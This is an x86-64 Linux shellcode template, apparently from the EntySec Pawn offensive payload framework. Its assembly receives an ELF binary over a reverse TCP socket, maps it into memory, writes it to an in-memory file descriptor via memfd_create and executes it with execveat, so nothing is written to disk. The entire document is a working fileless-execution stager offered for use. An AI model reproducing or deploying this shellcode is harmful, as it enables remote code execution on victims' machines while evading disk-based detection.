<%doc>
This template requires Pawn: https://github.com/EntySec/Pawn
Current source: https://github.com/EntySec/Pawn
</%doc>

<%doc>
Copyright (c) Ivan Nikolskiy 2023
Copyright (c) Tomas Globis 2023

This shellcode attempts to establish reverse TCP connection, reads ELF length,
reads ELF and maps it into the memory, creates memory file descriptor, writes
loaded ELF to it and executes. This shellcode can be used for fileless ELF
execution, because no data is written to disk.
</%doc>

<%page args="length, reliable, obsolete, sock"/>
start:
%if length:
    push    ${hex(length)}
%else:
    push    0x8
    pop     rdx
    push    0x0
    lea     rsi, [rsp]
    xor     rax, rax

%if sock != 'rdi':
    push    ${sock}
    pop     rdi
%endif
    syscall

%if reliable:
    test    rax, rax
    js      fail
%endif
%endif

    pop     r12
    push    rdi
    pop     r13

    xor     rax, rax
    push    rax
    push    rsp
    sub     rsp, 8
    mov     rdi, rsp
    push    0x13f
    pop     rax
    xor     rsi, rsi
    syscall

    push    rax
    pop     r14

    push    0x9
    pop     rax
    xor     rdi, rdi
    push    r12
    pop     rdi
    push    0x7
    pop     rdx
    xor     r9, r9
    push    0x22
    pop     r10
    syscall

    push    rax
    pop     r15

%if reliable:
    test    rax, rax
    js      fail
%endif

    push    0x2d
    pop     rax
    push    r13
    pop     rdi
    push    r15
    pop     rsi
    push    r12
    pop     rdx
    push    0x100
    pop     r10
    syscall

    push    0x1
    pop     rax
    push    r14
    pop     rdi
    push    r12
    pop     rdx
    syscall

${obsolete}

%if obsolete:
    add     rsp, 16
    mov     qword ptr [rsp], 0x6f72702f
    mov     qword ptr [rsp+4], 0x65732f63
    mov     qword ptr [rsp+8], 0x662f666c
    mov     qword ptr [rsp+12], 0x002f64

${include('linux/x64/itoa')}

strike:
    push    0x3b
    pop     rax
    push    rsp
    pop     rdi
    xor     rdx, rdx
    push    rdx
%else:
strike:
    push    0x142
    pop     rax
    push    r14
    pop     rdi
    push    rsp
    sub     rsp, 8
    mov     rsi, rsp
    xor     r10, r10
    xor     rdx, rdx
    push    0x1000
    pop     r8
    syscall
%endif

%if reliable:
fail:
    push    0x3c
    pop     rax
    xor     rdi, rdi
    syscall
%endif